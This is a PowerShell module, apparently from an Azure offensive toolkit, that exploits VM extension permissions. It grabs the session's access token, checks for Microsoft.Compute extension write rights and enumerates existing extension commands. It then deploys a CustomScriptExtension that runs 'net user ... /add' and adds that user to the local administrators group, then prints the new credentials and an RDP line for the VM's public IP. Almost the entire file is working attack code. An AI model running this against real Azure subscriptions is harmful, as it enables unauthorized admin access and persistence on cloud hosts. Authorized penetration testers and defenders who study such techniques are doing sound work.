# VM Extension exploitation module

function Invoke-VMExtensionExploit {
    Write-Host "`n`n=== VM EXTENSION EXPLOITATION ===" -ForegroundColor Red
    
    if (@($Global:VirtualMachines).Count -eq 0) {
        Write-Host "[-] No Virtual Machines available" -ForegroundColor Red
        return
    }
    
    # Retrieve token for direct API calls
    Write-Host "`n[*] Retrieving access token for direct API calls..." -ForegroundColor Yellow
    try {
        $azProfile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile
        Write-ExecutedCommand "Get-AzContext"
        $currentContext = Get-AzContext
        $profileClient = New-Object Microsoft.Azure.Commands.ResourceManager.Common.RMProfileClient($azProfile)
        $token = $profileClient.AcquireAccessToken($currentContext.Tenant.TenantId).AccessToken
        Write-Host "[+] Access token retrieved successfully" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to retrieve access token: $_" -ForegroundColor Red
        return
    }
    
    # Select VM
    Write-Host "`n[*] Available Virtual Machines:" -ForegroundColor Cyan
    for ($i = 0; $i -lt $Global:VirtualMachines.Count; $i++) {
        Write-Host "  [$i] $($Global:VirtualMachines[$i].Name) (RG: $($Global:VirtualMachines[$i].ResourceGroupName))" -ForegroundColor White
    }
    
    $vmIndex = Read-Host -Prompt "Select Virtual Machine index"
    $vmResource = $Global:VirtualMachines[$vmIndex]
    
    Write-Host "`n--- VM Extensions for: $($vmResource.Name) ---" -ForegroundColor Cyan
    
    # Check permissions via direct API
    Write-Host "`n[*] Checking VM extension permissions via direct API call..." -ForegroundColor Yellow
    $subscriptionId = $currentContext.Subscription.Id
    $URI = "https://management.azure.com/subscriptions/${subscriptionId}/resourceGroups/$($vmResource.ResourceGroupName)/providers/Microsoft.Compute/virtualMachines/$($vmResource.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    
    Write-ExecutedCommand "Invoke-RestMethod -Method GET -Uri `"$URI`" -Headers @{Authorization=`"Bearer `$token`"}"
    
    $hasExtensionWrite = $false
    $hasExtensionRead = $false
    
    try {
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{ 'Authorization' = "Bearer $token" }
        }
        $permissions = (Invoke-RestMethod @RequestParams -ErrorAction Stop).value
        
        if ($permissions) {
            Write-Host "[+] Found permissions via API:" -ForegroundColor Green
            
            foreach ($perm in $permissions) {
                if ($perm.actions -contains "Microsoft.Compute/virtualMachines/extensions/write" -or
                    $perm.actions -contains "Microsoft.Compute/virtualMachines/extensions/*" -or
                    $perm.actions -contains "Microsoft.Compute/virtualMachines/*" -or
                    $perm.actions -contains "Microsoft.Compute/*" -or
                    $perm.actions -contains "*") {
                    $hasExtensionWrite = $true
                }
                
                if ($perm.actions -contains "Microsoft.Compute/virtualMachines/extensions/read" -or
                    $perm.actions -contains "Microsoft.Compute/virtualMachines/extensions/*" -or
                    $perm.actions -contains "Microsoft.Compute/virtualMachines/*" -or
                    $perm.actions -contains "Microsoft.Compute/*" -or
                    $perm.actions -contains "*") {
                    $hasExtensionRead = $true
                }
                
                Write-Host "  Actions: $($perm.actions -join ', ')" -ForegroundColor White
                if ($perm.notActions) {
                    Write-Host "  NotActions: $($perm.notActions -join ', ')" -ForegroundColor Yellow
                }
            }
            
            if ($hasExtensionWrite) {
                Write-Host "`n[!] WRITE permission detected! Can create/modify VM extensions!" -ForegroundColor Red
            }
            if ($hasExtensionRead) {
                Write-Host "[+] READ permission detected! Can enumerate VM extensions" -ForegroundColor Green
            }
        } else {
            Write-Host "[-] No permissions returned" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[-] Error checking permissions via API: $_" -ForegroundColor Red
    }
    
    # Enumerate existing extensions
    Write-Host "`n[*] Enumerating existing VM extensions..." -ForegroundColor Yellow
    try {
        Write-ExecutedCommand "Get-AzVMExtension -ResourceGroupName $($vmResource.ResourceGroupName) -VMName $($vmResource.Name)"
        $extensions = Get-AzVMExtension -ResourceGroupName $vmResource.ResourceGroupName -VMName $vmResource.Name -ErrorAction Stop
        
        if ($extensions) {
            Write-Host "[+] Found $(@($extensions).Count) extension(s)" -ForegroundColor Green
            
            foreach ($ext in $extensions) {
                Write-Host "`n  Extension: $($ext.Name)" -ForegroundColor Yellow
                Write-Host "    Publisher          : $($ext.Publisher)" -ForegroundColor White
                Write-Host "    Type               : $($ext.ExtensionType)" -ForegroundColor White
                Write-Host "    Version            : $($ext.TypeHandlerVersion)" -ForegroundColor White
                Write-Host "    Provisioning State : $($ext.ProvisioningState)" -ForegroundColor White
                
                if ($ext.PublicSettings) {
                    Write-Host "    Public Settings:" -ForegroundColor White
                    $ext.PublicSettings | ConvertTo-Json -Depth 3 | ForEach-Object { Write-Host "      $_" -ForegroundColor Gray }
                    
                    if ($ext.PublicSettings.commandToExecute) {
                        Write-Host "`n    [!] Command found: $($ext.PublicSettings.commandToExecute)" -ForegroundColor Red
                    }
                }
            }
        } else {
            Write-Host "[-] No extensions found" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[-] Error enumerating extensions: $_" -ForegroundColor Red
    }
    
    # Exploit if write permissions available
    if (-not $hasExtensionWrite) {
        Write-Host "`n[-] No WRITE permissions. Cannot create VM extension." -ForegroundColor Red
        Write-Host "`n[*] Press any key to return to main menu..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host "`n[?] Do you want to create a local admin user on $($vmResource.Name)? (y/n): " -ForegroundColor Red -NoNewline
    $createUserChoice = Read-Host
    
    if ($createUserChoice -ne 'y' -and $createUserChoice -ne 'Y') {
        Write-Host "[*] Skipping user creation" -ForegroundColor Yellow
        Write-Host "`n[*] Press any key to return to main menu..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host "`n=== Creating Local Admin User ===" -ForegroundColor Red
    
    $username = Read-Host -Prompt "Enter username for new local admin"
    $password = Read-Host -Prompt "Enter password for new local admin"
    
    # Get VM location
    try {
        Write-ExecutedCommand "Get-AzVM -ResourceGroupName $($vmResource.ResourceGroupName) -Name $($vmResource.Name)"
        $vmDetails = Get-AzVM -ResourceGroupName $vmResource.ResourceGroupName -Name $vmResource.Name -ErrorAction Stop
        $vmLocation = $vmDetails.Location
    } catch {
        Write-Host "[-] Could not retrieve VM location, using resource location" -ForegroundColor Yellow
        $vmLocation = $vmResource.Location
    }
    
    # Build command
    $command = "powershell net user $username $password /add /Y; net localgroup administrators $username /add"
    $settingsString = "{`"commandToExecute`":`"$command`"}"
    
    Write-Host "`n[*] Configuration:" -ForegroundColor Cyan
    Write-Host "  VM Name       : $($vmResource.Name)" -ForegroundColor White
    Write-Host "  Resource Group: $($vmResource.ResourceGroupName)" -ForegroundColor White
    Write-Host "  Location      : $vmLocation" -ForegroundColor White
    Write-Host "  Username      : $username" -ForegroundColor White
    Write-Host "  Command       : $command" -ForegroundColor Gray
    
    Write-Host "`n[!] Press any key to create the VM extension and add local admin user..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
    Write-Host "`n[*] Creating VM extension..." -ForegroundColor Yellow
    try {
        Write-ExecutedCommand "Set-AzVMExtension -ResourceGroupName $($vmResource.ResourceGroupName) -VMName $($vmResource.Name) -Location $vmLocation -ExtensionName `"ExecCmd`" -Publisher `"Microsoft.Compute`" -ExtensionType `"CustomScriptExtension`" -TypeHandlerVersion `"1.8`" -SettingString `"$settingsString`""
        
        $result = Set-AzVMExtension `
            -ResourceGroupName $vmResource.ResourceGroupName `
            -VMName $vmResource.Name `
            -Location $vmLocation `
            -ExtensionName "ExecCmd" `
            -Publisher "Microsoft.Compute" `
            -ExtensionType "CustomScriptExtension" `
            -TypeHandlerVersion "1.8" `
            -SettingString $settingsString `
            -ErrorAction Stop
        
        if ($result.IsSuccessStatusCode) {
            Write-Host "[+] VM Extension created successfully!" -ForegroundColor Green
            Write-Host "[+] Local admin user '$username' should be created on $($vmResource.Name)" -ForegroundColor Green
            Write-Host "`n[*] Credentials:" -ForegroundColor Cyan
            Write-Host "  Username: $username" -ForegroundColor Red
            Write-Host "  Password: $password" -ForegroundColor Red
            
            # Get public IP if available
            try {
                Write-ExecutedCommand "Get-AzVM -ResourceGroupName $($vmResource.ResourceGroupName) -Name $($vmResource.Name)"
                $vm = Get-AzVM -ResourceGroupName $vmResource.ResourceGroupName -Name $vmResource.Name -ErrorAction Stop
                if ($vm.NetworkProfile.NetworkInterfaces) {
                    $nicId = $vm.NetworkProfile.NetworkInterfaces[0].Id
                    $nicName = $nicId.Split('/')[-1]
                    
                    Write-ExecutedCommand "Get-AzNetworkInterface -ResourceGroupName $($vm.ResourceGroupName) -Name $nicName"
                    $nic = Get-AzNetworkInterface -ResourceGroupName $vm.ResourceGroupName -Name $nicName -ErrorAction Stop
                    
                    if ($nic.IpConfigurations[0].PublicIpAddress) {
                        $publicIpId = $nic.IpConfigurations[0].PublicIpAddress.Id
                        $publicIpName = $publicIpId.Split('/')[-1]
                        
                        Write-ExecutedCommand "Get-AzPublicIpAddress -ResourceGroupName $($vm.ResourceGroupName) -Name $publicIpName"
                        $publicIp = Get-AzPublicIpAddress -ResourceGroupName $vm.ResourceGroupName -Name $publicIpName -ErrorAction Stop
                        
                        Write-Host "`n[*] Connection Info:" -ForegroundColor Cyan
                        Write-Host "  RDP: mstsc /v:$($publicIp.IpAddress)" -ForegroundColor Green
                    }
                }
            } catch {
                # Silent
            }
        } else {
            Write-Host "[-] VM Extension creation returned unsuccessful status" -ForegroundColor Red
        }
    } catch {
        Write-Host "[-] Error creating VM extension: $_" -ForegroundColor Red
    }
    
    Write-Host "`n[*] Press any key to return to main menu..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Helper function to display executed commands
function Write-ExecutedCommand {
    param(
        [string]$Command
    )
    Write-Host "`n[CMD] " -ForegroundColor Magenta -NoNewline
    Write-Host $Command -ForegroundColor Gray
}
